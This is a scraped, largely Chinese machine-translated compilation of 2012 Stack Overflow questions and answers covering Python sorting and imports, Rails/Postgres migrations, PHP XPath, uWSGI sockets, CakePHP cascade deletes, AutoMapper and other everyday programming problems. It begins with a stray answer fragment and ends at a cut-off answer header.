尝试[用于 iphone的](http://dev.metaio.com/en/sdk/getting-started/)[metaio](http://dev.metaio.com/en/) sdk ，支持您需要的一切..

# python - 使用带有键多个参数的 L.sort 对字符串列表进行排序

> ID：12603472
> 
> 赞同：0
> 
> 时间：2012-09-26T13:59:41.740
> 
> 标签：python

对 Python 很陌生，一直在玩列表和排序成员。我的问题是我是否有一个随机字符串列表（所有字符串长度相等）：

```
li=["hgjtud", "iernfd", "scoeps", "stiiss", "stripe"] 
```

现在我想根据我用以下函数定义的某个等级对该列表进行排序：

```
def rank_string(str1,str2):
    rank=0
    for i in range(len(str1)): #all strings will be checked to be equal length
        if (str1[i]==str2[i]):
            rank += 1
    return rank 
```

现在我想使用这个函数和一个目标字符串对我的列表进行排序，所以我尝试以下操作：

```
target_string="stripe"
df = lambda x:rank_string(x,target_string)
sorted_list = resultlist.sort(key=df) 
```

我的印象是所有列表值将在一次通过排名函数后被赋予一个键，然后根据这个排序？这会运行，但 sorted_list 的值为 None。我假设作为一个 n00b，我缺少一些基本的东西。什么？:-)

我在这里先向您的帮助表示感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:02:47.797

该方法*就地*`.sort()`排序并且不返回任何内容。

 *[`sorted()`](http://docs.python.org/library/functions.html#sorted)如果您希望返回排序列表并且原始输入列表保持不变，请改用。

```
>>> a = [2, 3, 1]
>>> a.sort()
>>> a
[1, 2, 3]
>>> b = [2, 3, 1]
>>> sorted(b)
[1, 2, 3]
>>> b
[2, 3, 1] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:07:59.820

正如其他人所说，`sorted()`将返回一个新列表。您的代码可能如下所示：

```
li = ["hgjtud", "iernfd", "scoeps", "stiiss", "stripe"]
target_string = "stripe"

sorted_list = sorted(li, key=lambda x: sum(1 for c1,c2 in zip(x, target_string) if c1==c2)) 
```

返回`['hgjtud', 'iernfd', 'scoeps', 'stiiss', 'stripe']`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:29:04.763

就像其他人说的那样，使用`sorted()`. 你也可以让事情变得更短：

```
from functools import partial

def rank_string(str1, str2):
    return sum(a == b for a, b in zip(str1, str2))

li = ["hgjtud", "iernfd", "scoeps", "stiiss", "stripe"]
sorted_list = sorted(li, key=partial(rank_string, "stripe")) 
```

[编辑]

```
from operator import eq

def rank_string(str1, str2):
    return sum(map(eq, str1, str2)) 
```

:-)

[/编辑]

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:03:01.050

`resultlist.sort`是 list 的一个方法，对 resultlist 进行就地排序，然后返回`None`.

`sorted_list = sorted(li, key=df)` 应该做的伎俩。*

# extjs - 如何告诉树面板再次呈现记录？

> ID：12603477
> 
> 赞同：2
> 
> 时间：2012-09-26T14:00:05.123
> 
> 标签：extjs, extjs4, extjs4.1

我以编程方式更改了树节点的一些值，并希望显示`Ext.tree.Panel`新值。

随着`set()`我的记录“脏”，但不知何故这不足以触发渲染器重新渲染该行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:11:24.710

请改用**[beginEdit()](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Model-method-beginEdit)**和**[endEdit()](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Model-method-endEdit)**。那应该触发负责任的事件

# python - 使用单个 main 执行多个 python 文件

> ID：12603482
> 
> 赞同：3
> 
> 时间：2012-09-26T14:00:17.823
> 
> 标签：python

我有多个 python 文件，每个文件都有不同的类和方法。我想使用我在所有文件之外单独拥有的主要功能来执行所有这些文件。

例如：

我有三个文件，分别是 one.py、two.py、three.py

我在其中任何一个中都没有 main 方法，但是当我执行它们时，我希望它们通过我单独拥有的 main 函数。这可能吗，怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-26T14:02:50.167

你的意思是你想导入它们？

```
import one
import two
import three

result = one.func()
instance = two.YourClass()
something = three.func() 
```

请注意，python 中没有“主要方法”（也许您一直在使用 JAVA？）。当您说 时`python thisfile.py`，python 会执行“thisfile.py”中的所有代码。我们使用的一个巧妙的小技巧是每个“模块”都有一个属性“**名称**”。直接调用的脚本（例如`thisfile.py`）被分配了名称`"__main__"`。这使您可以将模块的一部分作为脚本分开，另一部分打算在其他地方重用。一个常见的用例是测试：

```
#file: thisfile.py
def func():
   return 1,2,3

if __name__ == "__main__":
   if func() != (1,2,3):
      print "Error with func"
   else:
      print "func checks out OK" 
```

现在，如果我将其作为 运行`python thisfile.py`，它将打印`func checks out OK`，但如果我将其导入另一个文件，例如：

```
#anotherfile.py
import thisfile 
```

然后我通过运行该文件`python anotherfile.py`，不会打印任何内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-26T14:04:22.930

将它们用作模块并将它们导入到包含 main 的脚本中。

```
import one
import two
import three

if __name__ == '__main__':
    one.foo()
    two.bar()
    three.baz() 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T14:03:50.973

创建一个新文件来导入这些文件并运行该文件。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-26T14:07:09.103

正如之前的答案所暗示的，如果您只需要重新使用该功能，请执行导入。

但是，如果您事先不知道文件名，则需要使用稍微不同的导入构造。对于`one.py`位于同一目录中的文件，请使用：

one.py的内容：

```
print "test"
def print_a():
    print "aa" 
```

您的主文件：

```
if __name__ == "__main__":
    imp = __import__("one")
    print dir(imp) 
```

打印出测试并提供有关导入文件中包含的方法的信息。

# xcode - xcode alloutput 窗口不起作用[包括图片]

> ID：12603489
> 
> 赞同：0
> 
> 时间：2012-09-26T14:00:43.190
> 
> 标签：xcode, printf, scanf

我输入了 1111 但它只显示第一个 1 我试图再次卸载并安装 xcode 但它没有工作我该怎么办请帮忙

```
int main()
{

    int num;

    printf("input: ");
    scanf("%d",&num);
    printf("%d",num);
    return 0;
} 
```

输出

> 输入：1
> 
> 1111

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:47:33.550

您应该使用 ObjectiveC 中的初学者教程。

如果你想“打印”一个变量（在这种情况下是整数），你必须这样做：

```
NSLog(@"My number is %d",num); 
```

如果你想“打印”一个 NSString 你应该这样做：

```
NSLog(@"My string is %@",String); 
```

# ruby-on-rails - Create association proxy from array of documents

> ID：12603493
> 
> 赞同：0
> 
> 时间：2012-09-26T14:00:50.447
> 
> 标签：ruby-on-rails, ruby, authentication, mongoid, access-control

I have models of one of my projects set up to something like this (using Rails 3.2 and Mongoid 3.0):

```
class Parent
  include Mongoid::Document

  has_many :kids

  def schools
    return kids.map { |kid| kid.school }
  end
end

class School
  include Mongoid::Document

  has_many :kids
end

class Kid
  include Mongoid::Document

  belongs_to :parent
  belongs_to :school
end 
```

My Parent model acts as a standard User model that I have set up with Devise. I want a `SchoolController` with an `index` and `show` method that only allow access to schools that the parent has a kid in. The best way to do this, according to this site: [http://www.therailsway.com/2007/3/26/association-proxies-are-your-friend/](http://www.therailsway.com/2007/3/26/association-proxies-are-your-friend/), is to do something like:

```
def index
  @schools = current_user.schools
end

def show
  @school = current_user.schools.find(params[:id])
end 
```

However, because Mongoid doesn't allow `has_many :through` relations, `Parent#schools` is a custom method which returns an array, not an assocition proxy, and therefore `#find` is not a method that can be used. Is there a way to create an association proxy from an array of documents? Or is there a smarter way to handle this simple access control issue?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T19:40:27.957

The most elegant way I have been able to solve this thus far is to attach a custom method to the array returned by `Parents#schools`.

I give the returned array a `#find` method:

```
class Parent
  include Mongoid::Document

  has_many :kids

  def schools
    schools = self.kids.map { |kid| kid.school }

    # Returns a school with the given id. If the school is not found, 
    # raises Mongoid::Errors::DocumentNotFound which mimics Criteria#find.
    def schools.find(id)
      self.each do |school|
        return school if school.id.to_s == id.to_s
      end
      raise Mongoid::Errors::DocumentNotFound.new(School, {:_id => id})
    end

    return schools
  end
end 
```

That way I can keep my Controller logic simple and consistent:

```
class ParentsController < ApplicationController

  def show
   @school = current_user.schools.find(params[:id])
  end

end 
```

Not sure if there is any better way at this point.

# html - Div 类：悬停在 IE 中无法正常工作

> ID：12603497
> 
> 赞同：2
> 
> 时间：2012-09-26T14:00:58.250
> 
> 标签：html, css

请使用 Internet Explorer 查看以下链接

[http://mojogobbles.com.sg/cupcake-menu/](http://mojogobbles.com.sg/cupcake-menu/)

似乎当我尝试将鼠标悬停在已声明的 div 类上时，`:hover`它不能正常工作，但在 chrome 中它工作得很好。知道为什么吗？

请仅使用 CSS 解决方案！

这是CSS编码

```
#f12{
    width: 400px;
    height: 30px;
    left: 470px;
    top: 1090px;
    position: absolute;
    background: transparent;
    opacity: 1;
    filter: alpha(opacity=0);
    float: left;
    border-width: 1px;
    border-style: inset;
    z-index: 99999;
}

#f12:hover ~ #floater{
    background:url(images/flavours/f12.jpg);
    width: 320px;
    height: 320px;
    opacity: 100;
    top: 30%;
    left: 0%;
    filter: alpha(opacity=100);
    float: left;
    position: fixed;
}

#f13{
    width: 100px;
    height: 50px;
    left: 550px;
    top: 460px;
    position: absolute;
    background: transparent;
    opacity: 1;
    filter: alpha(opacity=0);
    float: left;
    -webkit-transition: 1s all;
    -moz-transition: 1s all;
    transition: 1s all;
    border-width: 1px;
    border-style: inset;
}

#f13:hover ~ #floater{
    background: url(images/flavours/f12.jpg);
    opacity: 100;
}

#floater{
    width: 320px;
    height:320px;
    opacity: 0;
    position: fixed;
    left: 0;
    top: 30%;
    filter: alpha(opacity=0);
    float: left;
    -webkit-transition: 0.5s ease-in-out;
    -moz-transition: 0.5s ease-in-out;
    -ms-transition: 0.5s ease-in-out;
    transition: 0.5s ease-in-out;
    border-width: 1px;
    border-style: inset;
    filter: alpha(opacity=100);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:18:31.333

您有两种 doctype，第一种是错误的将 IE 置于 quirks 模式。只需删除它们并使用这个：`<!DOCTYPE html>`

# ruby-on-rails - 推送到 Heroku 时出现带有 Postgres 的 Rails 迁移错误

> ID：12603498
> 
> 赞同：21
> 
> 时间：2012-09-26T14:00:59.697
> 
> 标签：ruby-on-rails, postgresql, heroku, rails-migrations

我正在尝试执行后续迁移以更改“tweet”模型表中的“number”列

```
class ChangeDataTypeForTweetsNumber < ActiveRecord::Migration
  def up
    change_column :tweets do |t|
      t.change :number, :integer
    end
  end

  def down
    change_table :tweets do |t|
      t.change :number, :string
    end
  end
end 
```

在执行到 heroku 的后续迁移后......

```
heroku rake db:migrate:up VERSION=20120925211232 
```

我收到以下错误

```
 PG::Error: ERROR:  column "number" cannot be cast to type integer
: ALTER TABLE "tweets" ALTER COLUMN "number" TYPE integer 
```

您的任何想法将不胜感激。

感谢大家。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-10-16T07:51:09.653

与上面相同，但更简洁一点：

```
change_column :yourtable, :column_to_change, 'integer USING CAST("column_to_change" AS integer)' 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2012-09-26T16:05:56.737

来自[精美手册](http://www.postgresql.org/docs/current/static/sql-altertable.html)：

> [ALTER TABLE ... ALTER COLUMN ...]
> 可选`USING`子句指定如何从旧列值计算新列值；如果省略，则默认转换与从旧数据类型到新数据类型的赋值转换相同。如果`USING`没有从旧类型到新类型的隐式或赋值转换，则必须提供子句。

PostgreSQL中没有从`varchar`to`int`的隐式转换，因此它抱怨`column "number" cannot be cast to type integer`并且 ALTER TABLE 失败。您需要告诉 PostgreSQL 如何将旧字符串转换为数字以匹配新列类型，这意味着您需要在 ALTER TABLE 中添加一个 USING 子句。我不知道有什么方法可以让 Rails 为你做到这一点，但你可以很容易地手动完成：

```
def up
  connection.execute(%q{
    alter table tweets
    alter column number
    type integer using cast(number as integer)
  })
end 
```

您需要注意不能转换为整数的值，如果有问题，PostgreSQL 会通知您，您必须在迁移成功之前修复它们。

您现有的向下迁移应该没问题，转换`integer`为`varchar`应该自动处理。

# android - DatePickerDialog，样式和兼容性

> ID：12603501
> 
> 赞同：1
> 
> 时间：2012-09-26T14:01:07.683
> 
> 标签：android, datepicker

我正在使用 DatePickerDialog，它通过 DialogFragment（来自支持库）显示。

如果 android:theme 设置为“android:Theme.Light”，则日期选择器对话框在 ICS 中正确显示。但是如果它设置为@android:style/Theme.NoTitleBar" Datepickerdialog 显示就好像在 3.0 以下的 Android 版本中一样

由于应用不显示标题栏，我们需要使用“NoTitleBar”。

我不确定我需要为 android:theme 设置哪个值才能使 Datepickerdialog 在 ICS 中正常工作。我尝试使用 DialogFragment 中的 setStye() 更改样式和主题，但没有成功。有什么建议我需要设置哪个主题？

谢谢

# php - OAuth 2.0 Google 云端硬盘

> ID：12603503
> 
> 赞同：0
> 
> 时间：2012-09-26T14:01:11.380
> 
> 标签：php, google-drive-api

嘿，我一直在尝试找出是否可以使用当前用户从 Google Drive API 对用户进行身份验证。

让我更好地解释一下自己：

我有一个网站，要求用户登录。我设法将 Google Drive 与其集成，它获取所有文档并插入数据库。我面临的“问题”是，如果我已经登录了网站之外的 Google 帐户（即 xyz@gmail.com）并且我的网站使用帐户 abc@gmail.com，那么 Google 云端硬盘会获取 xyz@gmail .com 文件，但我想要 abc@gmail.com 的文件。

所以我的问题是：是否可以通过从网站登录获取电子邮件和密码并通过 Google Drive 传递给我，使用 OAuth 2.0 对用户进行身份验证和授权？

# javascript - 跨函数访问 SoundManager 2

> ID：12603508
> 
> 赞同：0
> 
> 时间：2012-09-26T14:01:31.600
> 
> 标签：javascript, flash, soundmanager2

好的，这东西太棒了！我在我的 .js 文件中安装了 SoundManager 2，并在我的页面上播放了音频。目前我唯一的问题是弄清楚如何在 soundManager.setup({...}) 之外播放音频。例如下面的作品很好......

```
function mSound() {
/*SETUP SOUND MANAGER 2*/
soundManager.setup({
// where to find flash audio SWFs, as needed
url: 'audio/',
onready: function() {
console.log('SM2 is ready to play audio!');

    /*MY SOUND COLLECTIONS*/ 
    soundManager.createSound({
    id: 'myIntro',
    url: 'audio/Indonesia.mp3',
    autoPlay: false,
    volume: 15
    });
    soundManager.play('myIntro');

}
});
} 
```

但是，如果我尝试将 soundManager.play('myIntro') 放入另一个函数中，例如...

```
function mIntro() {
 soundManager.play('myIntro');
} 
```

...音频不播放。任何建议都会很棒！

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-16T20:21:35.530

你有没有尝试过这样的事情？

```
var sound = soundManager.getSoundById('myIntro');
sound.play(); 
```

它在我的项目中工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T15:24:42.073

我想我解决了。通过将局部变量设置为我的 mSound() 函数的参数，如下所示......

```
function mSound(id,url,volume) {
this.id = id;
this.url = url;
this.volume = volume;

/*SETUP SOUND MANAGER 2*/
soundManager.setup({
url: 'audio/',
onready: function() {
         //console.log('SM2 is ready to play audio!');
     /*MY SOUND COLLECTIONS*/ 
     soundManager.createSound({
     id: id,
     url: 'audio/'+ url,
     volume: volume
     });
     soundManager.play(id);
     }
}); 
} 
```

...我现在可以在其他 javascript 函数中做类似这样的很酷的东西并播放声音！

```
mSound('myIntro','Indonesia.mp3',5); 
```

加载自定义函数后，您仍然可以使用 soundManager 全局对象属性。例如，您可以稍后在代码中像这样暂停您的曲目...

```
 soundManager.togglePause('myIntro'); 
```

希望这可以帮助某人:)

# automapper - 类库中的 AutoMapper

> ID：12603511
> 
> 赞同：6
> 
> 时间：2012-09-26T14:01:40.757
> 
> 标签：automapper

我创建了一个类库来放置我的存储库、域模型和我的 DTO。例如，当用户调用 ClienteRepository.GetById(1) 时，它应该获取 Client 域模型并转换为 ClientDTO 以返回此，例如：

```
public class ClientRepository{
     public ClientDTO GetById(int id){
          var clientDto = Mapper.Map<Client, ClientDTO>(_db.Client.Find(id));

          return clientDto;
     }

} 
```

问题是 Mapper.Map 不起作用，因为我没有创建地图（`Mapper.CreateMap<Client, ClientDTO>()`）。

我的问题：如果我没有 global.asax 来创建它，我该如何在类库中执行此操作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-09T18:40:25.433

[我使用https://github.com/davidebbo/WebActivator](https://github.com/davidebbo/WebActivator)解决了我的问题。只需创建一个新类并输入以下代码：

```
[assembly: WebActivator.PostApplicationStartMethod(typeof (MapsInit), "Activate")]
namespace Database
{
    public static class MapsInit
    {
        public static void Activate()
        {
            Mapper.CreateMap<ClienteDto, Cliente>();
            Mapper.CreateMap<Cliente, ClienteDto>();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-26T14:08:21.843

Automapper 不需要 Global.asax。这只是为 Web 项目进行映射初始化的更好方法。

只需将您的初始化代码放在静态构造函数中

```
 static MyStaticCtor()
    {
        //samples
        //Mapper.CreateMap<AccountViewModel, Account>();
        //Mapper.CreateMap<AccountSettingViewModel, AccountSetting>()

        Mapper.AssertConfigurationIsValid();
    } 
```

甚至，您可以在存储库的构造函数中简单地执行此操作。

# php - 如何按类获取图像src

> ID：12603516
> 
> 赞同：5
> 
> 时间：2012-09-26T14:01:54.623
> 
> 标签：php, regex, domdocument

我有这个：

```
<a href="/Dealer-Catalog/ManufacturerID-3"><img class="brand-logo" src="http://www.teledynamics.com/tdresources/74c42cb2-dc7f-4548-b820-2946fbe160db.jpg" onerror="this.src='/Content/Css/Images/no_brand_logo_120_48.gif'" alt="ADTRAN"></a> 
```

如何获取 img src (http://www.teledynamics.com/tdresources/74c42cb2-dc7f-4548-b820-2946fbe160db.jpg)

我尝试了很多认为这是最后一个：

```
$doc = new DOMDocument();
libxml_use_internal_errors(true);
$doc->loadHTML($html);
$xpath = new DOMXPath($doc);
$src = $xpath->evaluate("string(//class='brand-logo']/img/@src)");
echo "$src"; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T14:04:40.867

这不是正确的 XPath 语法。尝试

```
$nodes = $xpath->query("//img[@class='brand-logo']");
$src = $nodes->item(0)->getAttribute('src'); 
```

首先，您获取代表您想要其 src 的图像的节点，然后您获得 src 属性。请注意，->query() 调用返回一个 DOMNodeList，而不是一个节点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:17:23.797

像这样试试

```
 <?php
    $html = '<a href="/Dealer-Catalog/ManufacturerID-3">
        <img class="brand-logo" src="http://www.teledynamics.com/tdresources/74c42cb2-dc7f-4548-b820-2946fbe160db.jpg"  alt="ADTRAN" />
        </a>';

    $xml = simplexml_load_string($html);
    echo $xml->img['src'];
    ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:27:29.213

像这样试试

```
<?php 
$doc=new DOMDocument();
$doc->loadHTML('<a href="/Dealer-Catalog/ManufacturerID-3">
        <img class="brand-logo" src="http://www.teledynamics.com/tdresources/74c42cb2-dc7f-4548-b820-2946fbe160db.jpg"  alt="ADTRAN" />
        </a>');
$xml=simplexml_import_dom($doc); // just to make xpath more simple
$images=$xml->xpath('//img');
foreach ($images as $img) {
    echo $img['src'];

}?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:14:26.123

使用 xpath 你可以直接查询一个属性，`string()`给它一个节点值：

```
$src = $xpath->evaluate("string(//img[@class='brand-logo']/@src)"); 
```

但是我*真的很抱歉*地说我不知道​​在你的情况下如何做到这一点`preg_match`；）

# django - 在其他文件夹中创建 uWSGI Socket？

> ID：12603522
> 
> 赞同：2
> 
> 时间：2012-09-26T14:02:12.580
> 
> 标签：django, nginx, uwsgi

我想在我的项目文件夹中创建 uWsgi 套接字，而不是在 /tmp/

这是我的 uWSGI 配置

```
[uwsgi]
socket = /tmp/uwsgi.sock #I want this in any other folder
#say in /home/me/Desktop/myDjangoApp/
chmod-socket = 666
processes = 1
master = true
vhost = true
no-site = true 
```

但是每当我使用在我的文件夹中创建的套接字重新启动 uWSGI 时，它**[fails]**。我不能在其他文件夹中创建 uwsgi.sock 吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-06-08T00:32:23.200

我使用以下 uwsgi 配置（简化为相关部分）：

```
[uwsgi]
uid = moin
gid = www-data
socket = /var/run/moin/uwsgi.sock
hook-as-root = exec:mkdir -vp /var/run/moin/; chown -v moin:www-data /var/run/moin/ 
```

请注意在服务器删除权限之前创建具有用户权限的 /var/run/wiki/ 目录的钩子。随意调用目录，moin 是我的 wiki 引擎的名称。

在较新的发行版上，/var/run 指向 tmpfs 位置，以便在重新启动后删除任何手动创建的目录。与添加/修改另一个初始化脚本相比，此文件中的挂钩定义使您的配置保持紧凑。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T08:22:38.870

好吧，我找到了相同的替代解决方案。我在 localhost 中创建了套接字

这是我的 uwsgi 文件

```
[uwsgi]
uid = www-data
gid = www-data
master = 1
workers = 2
plugins = python
socket = 127.0.0.1:3100
enable-threads = true
processes = 2
pythonpath = <>
wsgi-file = <>
chdir = <> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T16:18:50.987

unix 套接字必须遵守文件权限方案。

在第二个配置中，您设置 uid=www-data 和 gid=www-data。套接字文件必须可被 www-data 写入，并且 nginx 必须能够读/写 /tmp/uwsgi.sock

另一方面，如果你觉得这很困难，使用 host:port (tcp sockets) 也可以，而且你似乎可以这样做。

# ruby - 奇怪的数组输出......如何将数组分配成单词并能够打印出来？

> ID：12603526
> 
> 赞同：-1
> 
> 时间：2012-09-26T14:02:35.013
> 
> 标签：ruby, arrays, serialization, ruby-on-rails-3.1, yaml

我有一个看起来像的数组

```
["", "Fitness", "Stationary", "Looks", "Access", "Food", 
"---\n- Stationary\n- Access\n- ''\n"] ["", "Fitness", 
"Stationary", "Looks", "Access", "Food", "---\n- Stationary\n- Access\n- ''\n"] 
```

我使用下面的代码来浏览它们......

```
<h3>Categories</h3>
<% for product in Product.select(:category)%>
    <% a = [""].concat(Product.select(:category).map(&:category).uniq) %>
<% end %>
<% a.each do |c| %>
    <p class="text-error"><%= link_to(c.delete("-"), ) %></p>
<% end %> 
```

我得到这样的东西......

```
Fitness
Stationary
Looks
Access
Food
Stationary Access '' 
```

完整代码位于：
[https ://github.com/abhishekdagarit/sample-app.git](https://github.com/abhishekdagarit/sample-app.git)

如何解决这个问题？如果数据库中有脏数据，我该如何清理？

这里有什么问题？以及如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:41:59.583

看起来您的数组中有 YAML：

```
jruby-1.7.0.preview2 :001 > require 'yaml'
 => true 
jruby-1.7.0.preview2 :002 > a = ["", "Fitness", "Stationary", "Looks", "Access", "Food", "---\n- Stationary\n- Access\n- ''\n"]
 => ["", "Fitness", "Stationary", "Looks", "Access", "Food", "---\n- Stationary\n- Access\n- ''\n"] 
jruby-1.7.0.preview2 :003 > YAML.load(a.last)
 => ["Stationary", "Access", ""] 
```

这意味着您`category`的表格列中可能有垃圾`products`。它是如何到达那里的，不确定；从 yml 文件中播种数据时可能发生了一些奇怪的事情？

避免这种情况的最好方法是制作一个名为 example 的`categories`引用表，并在表中使用`category_id`外键引用该`products`表。这样，在创建产品时，您可以显示一个仅包含有效类别的下拉列表，并防止将无效类别添加到数据库中。

# cakephp - Is it possible to custom the delete on cascade of CakePHP?

> ID：12603536
> 
> 赞同：2
> 
> 时间：2012-09-26T14:03:02.487
> 
> 标签：cakephp, cakephp-2.0, cakephp-2.1, cascading-deletes, cakephp-2.2

I have a table with logs related to the Post ones and i dont want its data to be deleted when i delete a Post.

In the other hand, i want to delete all the comments of the Post as well as other data.

I have been taking a look at the documentation but they dont say anything about it: [http://book.cakephp.org/2.0/en/models/deleting-data.html](http://book.cakephp.org/2.0/en/models/deleting-data.html)

Thanks.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T06:59:21.733

You can do this in at least two different ways.

On is when you're calling `$this->Post->delete($id, $cascade)` [the second parameter is a boolean](http://book.cakephp.org/2.0/en/models/deleting-data.html#delete) that shows if the delete operation should also remove any associated records - such that **depend** on a Post record:

```
$this->Post->delete($id, false); 
```

Will not delete any associated records. This is also true for [$this->Model->deleteAll();](http://book.cakephp.org/2.0/en/models/deleting-data.html#deleteall)This is when you want to set it **not globally**.

**Depends** is very important because this concept could also be set in the configuration of a `hasMany` or `hasOne` relation so that this is the default deletion behaveour:

```
public $hasMany = array(
    'Log' => array(
        'className' => 'Log',
        'foreignKey' => 'post_id',
        'dependent' => false
    )
); 
```

In this example, Log records will **NOT** be deleted when their associated Post record has been deleted.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:20:03.400

You can try removing the association before calling the delete using `$this->Post->unbindModel('hasMany' => 'Log')` (or `$this->unbindModel('hasMany' => 'Log'`inside Post model.)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T09:22:38.257

If your back end is MySQL, you can switch off foreign key checks (SET FOREIGN_KEY_CHECKS=0;), remove the parent Post and its comments, and re-enable foreign key checks (SET FOREIGN_KEY_CHECKS=1;). **I don't recommend this however.**

I'd be inclined to implement a 'soft delete' on posts (give it a 'deleted' field and add an index to it which you set to true when it's deleted) and update your front end queries to ignore any posts with deleted = 1

There are a few soft delete behaviors out there but the code is pretty simple to implement.

# asp.net - 使用 ASP.NET 处理 JavaScript 的服务器端代码

> ID：12603540
> 
> 赞同：0
> 
> 时间：2012-09-26T14:03:27.163
> 
> 标签：asp.net

我正在尝试获取使用 JavaScript 的服务器端代码。我究竟做错了什么？

```
function openUp(name)
{
    document.getElementById(name).style.display =  <%if (Request.ServerVariables["HTTP_USER_AGENT"].Contains("FireFox"))Then %>
        response.write('table-row'); <%else%> response.write('block');
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:09:54.950

您的`Response.Write`声明（大小写不正确）应该在`<% %>`标签内。您的代码中似乎也有 C# 和[VB.NET](http://en.wikipedia.org/wiki/Visual_Basic_.NET)的奇怪混合。您正在使用以下哪个？

C＃

```
document.getElementById(name).style.display =  
    <% if (Request.ServerVariables["HTTP_USER_AGENT"].Contains("FireFox"))
           Response.Write("'table-row'");
       else
           Response.Write("'block'"); %>; // Semi-colon outside of %> is for JavaScript 
```

VB.NET

```
document.getElementById(name).style.display =  
    <% If (Request.ServerVariables("HTTP_USER_AGENT").Contains("FireFox")) Then
           Response.Write("'table-row'") 
       Else
           Response.Write("'block'")
       End If %>; // Semi-colon outside of %> is for JavaScript 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:10:13.777

要回答您的问题，您可以将代码更新为；

C＃

```
document.getElementById(name).style.display = '<%Response.Write((Request.ServerVariables["HTTP_USER_AGENT"].Contains("FireFox") ? "table-row": "block")); %>'; 
```

VB

```
document.getElementById(name).style.display = '<%Response.Write(IIF(Request.ServerVariables["HTTP_USER_AGENT"].Contains("FireFox"), "table-row", "block")) %>'; 
```

# python - 只导入一个类静态方法

> ID：12603541
> 
> 赞同：22
> 
> 时间：2012-09-26T14:03:31.633
> 
> 标签：python, inheritance, import

我在基类中有以下装饰器：

```
class BaseTests(TestCase):
    @staticmethod
    def check_time(self, fn):
        @wraps(fn)
        def test_wrapper(*args,**kwargs):
            # do checks ...
        return test_wrapper 
```

以及从 BaseTests 继承的以下类：

```
from path.base_posting import BaseTests
from path.base_posting.BaseTests import check_time  # THIS LINE DOES NOT WORK!

class SpecificTest(BaseTests):

    @check_time # use the decorator
    def test_post(self):
        # do testing ... 
```

我想像上面一样在SpecificTest中使用装饰器，而不必使用BaseTests.check_time，因为在原始代码中它们的名称很长，我不得不在很多地方使用它。有任何想法吗？

编辑：我决定让 check_time 在 BaseTests 文件中成为一个独立的函数，然后简单地导入

```
from path.base_posting import BaseTests, check_time 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-26T14:05:41.643

简单的说

```
check_time = BaseTests.check_time 
```

在您的第二个模块中：

* * *

```
from module_paths.base_posting import BaseTests
check_time = BaseTests.check_time

class SpecificTest(BaseTests):

    @check_time # use the decorator
    def test_post(self):
        # do testing ... 
```

* * *

您可能还想重新考虑制作`check_time`静态方法，因为您的用例似乎更多地将其用作独立函数而不是静态方法。

# c# - IEnumerable 的解释

> ID：12603544
> 
> 赞同：-3
> 
> 时间：2012-09-26T14:03:43.217
> 
> 标签：c#, asp.net, asp.net-mvc-3

在下面，我截取了我正在查看的代码的一部分。我不明白代码的 IEnumerable 部分。有人可以带我了解每行的含义吗？谢谢

我不明白 Where(u =>) 比其他人更多。

```
 public static List<AAlexUsers.Models.SearchClass> Users(string userId, string email, string lastFourdigits)   
    {
        SearchClass Alex = new SearchClass();
        Alex.userId = "1234";
        Alex.email = "Alex@gmail.com";
        Alex.lastFourdigits = "1885";

        SearchClass Emilio = new SearchClass();
        Emilio.userId = "0928";
        Emilio.email = "Cubano@gmail.com";
        Emilio.lastFourdigits = "0706";

        SearchClass Ulysses = new SearchClass();
        Ulysses.userId = "0914";
        Ulysses.email = "lysses@gmail.com";
        Ulysses.lastFourdigits = "01zx";

        var list = new List<SearchClass>();
        list.Add(Alex);
        list.Add(Emilio);
        list.Add(Ulysses);

        IEnumerable<SearchClass> result = list;
         if (!string.IsNullOrEmpty(userId))
            result = result.Where(u => u.userId == userId);
        if (!string.IsNullOrEmpty(email))
            result = result.Where(u => u.email == email);
        if (!string.IsNullOrEmpty(lastFourdigits))
            result = result.Where(u => u.lastFourdigits == lastFourdigits);

        return list.ToList();

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:06:36.480

